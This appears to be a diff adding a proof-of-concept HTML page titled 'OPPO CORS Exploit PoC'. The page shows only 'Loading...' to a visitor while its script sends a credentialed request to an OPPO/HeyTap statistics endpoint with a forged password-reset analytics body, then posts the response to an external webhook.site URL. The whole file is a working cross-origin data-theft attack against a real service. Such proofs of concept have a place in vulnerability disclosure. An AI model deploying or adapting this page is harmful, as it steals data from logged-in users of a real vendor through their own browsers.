@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>OPPO CORS Exploit PoC</title>
+  </head>
+  <body>
+    <h1>Loading...</h1>
+    <script>
+      fetch("https://event-in-dc.heytapmobile.com/stat/dcs", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json;charset=UTF-8"
+        },
+        body: JSON.stringify({
+          head: {
+            model: "web",
+            imei: "123456789012345",
+            osVersion: "MacIntel",
+            brand: "OPPO"
+          },
+          body: [{
+            logTag: "web_reset_pwd",
+            appId: 3012,
+            eventTime: new Date().toISOString(),
+            eventID: "next_button",
+            appName: "Netscape",
+            appPackage: navigator.userAgent,
+            appVersion: "5.0",
+            logMap: JSON.stringify({
+              reqpkg: "id.oppo.com",
+              scene: "pc_web",
+              type: "click",
+              url: "https://id.oppo.com/v2/profile/reset_pwd.html"
+            })
+          }]
+        })
+      })
+      .then(response => response.text())
+      .then(data => {
+        // Send the response body to your webhook
+        fetch("https://webhook.site/554478c6-3aaf-4a07-8c60-f34aaec1f0ef", {
+          method: "POST",
+          headers: { "Content-Type": "text/plain" },
+          body: data
+        });
+      });
+    </script>
+  </body>
+</html>
